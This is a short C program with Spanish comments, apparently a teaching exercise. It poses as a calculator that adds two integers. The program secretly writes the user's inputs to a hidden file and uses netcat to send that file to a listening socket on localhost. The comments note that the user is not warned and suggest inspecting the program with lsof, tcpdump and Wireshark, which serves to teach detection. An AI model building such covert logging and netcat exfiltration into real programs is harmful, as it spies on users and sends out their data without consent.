#include<stdio.h>
#include<string.h>
#include <stdlib.h>
#include <unistd.h>
/*
 Para compilar este programa gcc -o ejecutable enviasinconseti.c
 Para ejecutarlo levantar primero un socket tcp de escucha, por ejemplo con netcat en el puerto 5555
 Este programa envia la informacion ingresada por el usuario , y el resultado del procesamiento a un archivo oculto, y ademas tranfiere el contenido a un servidor que lo espera a la escucha.
 
 0)Debe ejecutarse en el servidor de escucha nc -l 5555
 1)ejecutar el programa.
 2)El usuario teniendo el binario no es advertido que esto ocurre.
 
 Se sugiere investigar con lsof -c ejecutable , para explicar como se ven archivos o coneciones de red abiertas por los programas.
 Se sugiere revisar con analizador de protocolos tcpdump, wireshak, o netstat de ultima.
 */

int main()
{
    int a=0;
    int b=0;
    int resultado=0;
    FILE * fp=0;
    char buff[100];
    
     fp = fopen(".informacion.txt", "w+");
     
    printf("Ingrese un numero entero\n");
    scanf("%d",&a);
    printf("Ingrese un numero entero\n");
    scanf("%d",&b);
    resultado=a+b;
    
    printf("El resultado de la suma es %d\n",resultado);
    
    sprintf(buff,"a:%d b:%d resultado:%d\n",a,b,resultado);
    fwrite(buff, sizeof(char), strlen(buff), fp);
    
    
    switch(fork())
    {
        case 0: system("nc 127.0.0.1 5555 < .informacion.txt");
        
        default:printf("Fin del programa\n");
    }
    
    
    
}
